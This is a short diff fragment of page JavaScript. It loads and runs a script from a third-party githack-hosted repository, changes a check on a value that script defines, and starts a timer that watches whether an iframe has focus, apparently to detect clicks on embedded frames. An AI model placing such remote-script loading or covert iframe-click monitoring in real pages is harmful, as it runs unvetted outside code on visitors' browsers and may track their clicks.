@@ -7,7 +7,7 @@
 // if (str in zy){
 var url = "https://raw.githack.com/imad047/00004.js/master/externaljs.js";
 $.getScript( url, function() {
-if(externaljs=='0B52-9uAkQ1sTT1ZxMGVsUXlDeU0'){  	
+if(externaljs=='https://raw.githack.com/imad047/00004.js/master/useexternaljs.html'){  	
 	var monitor = setInterval(function(){
 		var elem = document.activeElement;if(elem && elem.tagName == 'IFRAME')
 			{
